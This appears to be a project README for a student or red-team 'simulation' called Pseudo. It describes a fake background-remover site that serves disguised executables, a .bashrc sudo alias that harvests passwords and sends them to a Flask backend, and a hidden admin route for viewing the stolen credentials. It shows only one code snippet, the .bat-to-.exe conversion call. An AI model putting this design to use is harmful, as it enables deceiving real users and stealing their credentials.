# Pseudo

## Authors: Abel Bellows, Michael Avrahami, Stanley Hoo

<img src="https://github.com/user-attachments/assets/d4f637eb-195c-4343-8998-11e9febaaf64" width="400">

---

## Introduction

**Pseudo** is a red-team simulation designed to demonstrate how social engineering and file disguise can be used to gain unauthorized access to user systems. It tricks naive users into installing our scripts and running it on their computer, stealing their sudo password and giving us access to their computer.

---

## Initiation

Our Flask app acts as the **delivery platform** for the virus, posing as a **free** image background remover tool.

It:
- Accepts an image upload from the user
- Processes and disguises the result image as an `.exe` (Windows) or `.desktop` (Linux)
- Sends the file back to the user disguised as their image with the background removed to bait execution
- Stores stolen `sudo` credentials from compromised machines

---

## Windows/Linux Payload Generation

- A `.bat` file (Windows) and a `.desktop` file (Linux) are both dynamically created using a Python template.
- Flask runs a Python script that converts the `.bat` file into an `.exe`:
  ```python
  subprocess.run([
      "wine", Bat_To_Exe_Converter_Path,
      "/bat", batfile,
      "/exe", exe_path,
      "/icon", ico_path,
      "/invisible"
  ])
  ```
- The icon is set for both to match the result image to reduce suspicion.
- Depending on the target's operating system, downloads the `.desktop` or `.exe` file.

---

## Result: Disguised Executable

To the user:
- The file appears to be their result image.
- Opening it via double-clicking from file explorer shows the result image.

Behind the scenes:
- It installs and runs the virus payload.
- Both the executables (`.exe`, `.desktop`) are **self-deleted after execution**.
---

## Sudo Password Harvesting

The payload modifies `.bashrc`:
- Aliases the `sudo` command
- Captures:
  - Username
  - Password
  - IP address

This info is sent to our Flask backend.

---

## Credential Storage (Admin View)

- Flask stores credentials in a SQLite database.
- Admins can access a hidden route (`/pA55w0Rds`) to:
  - View stolen login data
  - See IPs and timestamps

---
